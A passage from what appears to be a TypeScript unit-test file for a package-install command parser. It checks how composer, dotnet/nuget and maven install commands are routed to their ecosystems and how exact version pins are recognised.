		expect(pinnedVersionViolation({ kind: "local_path", path: "./x" }, "npm")).toBeNull();
	});

	it("accepts prerelease and build metadata as exact", () => {
		expect(isExactPinnedVersion("1.2.3-beta.1")).toBe(true);
		expect(isExactPinnedVersion("1.2.3+build.5")).toBe(true);
		expect(isExactPinnedVersion("4.17")).toBe(false);
		expect(isExactPinnedVersion("latest")).toBe(false);
	});
});

describe("parseInstallCommands — composer / nuget / maven ecosystems", () => {
	it("routes composer require to the composer ecosystem", () => {
		const cmd = nonNull(parseInstallCommands("composer require monolog/monolog:2.9.1")[0]);
		expect(cmd?.ecosystem).toBe("composer");
		expect(cmd?.packages[0]).toMatchObject({ name: "monolog/monolog", version: "2.9.1" });
	});
	it("routes dotnet add package to nuget", () => {
		const cmd = nonNull(parseInstallCommands("dotnet add package Newtonsoft.Json --version 13.0.1")[0]);
		expect(cmd?.ecosystem).toBe("nuget");
		expect(cmd?.packages[0]).toMatchObject({ name: "Newtonsoft.Json", version: "13.0.1" });
	});
	it("routes nuget install to nuget", () => {
		const cmd = nonNull(parseInstallCommands("nuget install Moq -Version 4.20.70")[0]);
		expect(cmd?.ecosystem).toBe("nuget");
	});
	it("routes mvn dependency:get to maven", () => {
		const cmd = nonNull(parseInstallCommands("mvn dependency:get -Dartifact=org.foo:bar:1.0.0")[0]);
		expect(cmd?.ecosystem).toBe("maven");
		expect(cmd?.packages[0]).toMatchObject({ name: "org.foo:bar", version: "1.0.0" });
	});
	it("returns [] for an unknown bin (parseExtendedEcosystem miss)", () => {
		expect(parseInstallCommands("frobnicate widget")).toEqual([]);
	});
});
